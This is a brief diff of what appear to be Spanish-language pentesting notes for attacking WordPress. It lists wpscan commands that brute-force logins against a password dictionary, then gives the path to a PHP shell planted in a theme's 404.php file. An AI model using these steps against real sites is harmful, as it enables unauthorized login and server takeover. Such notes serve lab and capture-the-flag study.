@@ -1,2 +1,7 @@
 wpscan -url "" 
 wpscan -url "" --usernames "" --passwords "dictio"
+
+
+
+acceder a la pagina php con la shell
+http://"ip o url"/wp-content/themes/"tema"/404.php
